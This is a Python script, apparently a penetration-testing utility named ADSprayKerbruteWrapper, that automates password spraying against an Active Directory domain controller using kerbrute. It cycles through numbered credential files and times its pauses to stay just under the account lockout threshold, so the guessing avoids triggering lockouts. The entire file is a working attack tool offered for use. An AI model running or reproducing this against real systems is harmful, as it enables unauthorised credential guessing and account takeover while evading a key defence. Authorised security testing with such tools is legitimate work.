import subprocess
import sys
import os
import time

version = "v1.0.0"

# ANSI color codes
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    END = '\033[0m'

def print_yellow(text):
    print(f"{Colors.YELLOW}{text}{Colors.END}")

def sync_time():
    # Stop VirtualBox Guest Utils or it will change the time back again
    #print_yellow(f"Stopping VirtualBox guest utils...")
    #cmd = ["sudo", "service"]
    #cmd.append("virtualbox-guest-utils")
    #cmd.append("stop")
    #subprocess.run(cmd)
    # Sync time with DC to prevent KRB_AP_ERR_SKEW
    print_yellow(f"Syncing time with DC {domaincontroller}...")
    cmd = ["sudo", "ntpdate"]
    cmd.append(domaincontroller)
    subprocess.run(cmd)

def modify_string(string, append_str):
    if '.' in string:
        parts = string.rsplit('.', 1)
        return parts[0] + append_str + '.' + parts[1]
    else:
        return string + append_str

def run_kerbrute(filenameArg, domain, account_lockout_threshold, reset_account_lockout_counter, domaincontroller, extra_flags=""):
    # Start the loop to run Kerbrute
    counterFile = 0
    counterKerbrute = 0
    while True:
        if counterFile == 0:
            filename = filenameArg
        else:
            filename = modify_string(filenameArg, "_"+str(counterFile))

        if not os.path.isfile(filename):
            print_yellow(f"\nFile {filename} does not exist.")
            break

        print_yellow(f"\nRunning Kerbrute with {filename}...")

        # Run Kerbrute with the provided arguments
        cmd = ["kerbrute", "bruteforce"]

        cmd.extend(["--domain", domain])

        cmd.extend(["--dc", domaincontroller])

        if extra_flags:
            cmd.extend(extra_flags.split())

        cmd.append(filename)

        subprocess.run(cmd)

        counterFile += 1
        counterKerbrute += 1
        # Check if account lockout threshold is reached
        if counterKerbrute == account_lockout_threshold-1:
            print_yellow(f"\nAccount lockout threshold {account_lockout_threshold} almost reached ({counterKerbrute}). Waiting for {reset_account_lockout_counter} minutes...")
            time.sleep(reset_account_lockout_counter * 60)
            counterKerbrute = 0

    print_yellow("Password spraying completed.")

if __name__ == "__main__":
    s = """   ___   ___  ____                   __ __        __            __     _      __                          
  / _ | / _ \/ __/__  _______ ___ __/ //_/__ ____/ /  ______ __/ /____| | /| / /______ ____  ___  ___ ____
 / __ |/ // /\ \/ _ \/ __/ _ `/ // / ,< / -_) __/ _ \/ __/ // / __/ -_) |/ |/ / __/ _ `/ _ \/ _ \/ -_) __/
/_/ |_/____/___/ .__/_/  \_,_/\_, /_/|_|\__/_/ /_.__/_/  \_,_/\__/\__/|__/|__/_/  \_,_/ .__/ .__/\__/_/   
              /_/            /___/                                                   /_/  /_/             """
    print_yellow(s)
    print_yellow("ADSprayKerbruteWrapper " + version)

    # Check if required arguments are provided
    if len(sys.argv) < 5:
        print_yellow("Usage: python script_name.py <filename> <domain> <account_lockout_threshold> <reset_account_lockout_counter> <domaincontroller> [extra_flags]")
        sys.exit(1)

    # Assign arguments to variables
    filename = sys.argv[1]
    domain = sys.argv[2]
    account_lockout_threshold = int(sys.argv[3])
    reset_account_lockout_counter = int(sys.argv[4])
    domaincontroller = sys.argv[5]
    extra_flags = sys.argv[6] if len(sys.argv) > 6 else ""

    # Check if filename exists
    if not os.path.isfile(filename):
        print_yellow(f"File {filename} does not exist.")
        sys.exit(1)

    # Sync time
    sync_time()

    # Run Kerbrute
    run_kerbrute(filename, domain, account_lockout_threshold, reset_account_lockout_counter, domaincontroller, extra_flags)

    # Start VirtualBox Guest Utils again
    #print_yellow(f"Starting VirtualBox guest utils...")
    #cmd = ["sudo", "service"]
    #cmd.append("virtualbox-guest-utils")
    #cmd.append("start")
    #subprocess.run(cmd)
